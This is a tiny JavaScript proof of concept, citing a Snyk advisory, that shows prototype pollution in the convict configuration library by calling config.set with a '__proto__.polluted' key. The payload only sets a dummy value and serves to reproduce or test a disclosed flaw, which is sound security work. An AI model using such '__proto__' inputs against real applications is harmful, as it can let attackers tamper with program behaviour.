//https://snyk.io/vuln/SNYK-JS-CONVICT-1062508
 
  const convict = require("convict");
  let obj = {};
  const config = convict(obj);

   

  config.set("__proto__.polluted", "yes");
// End of file
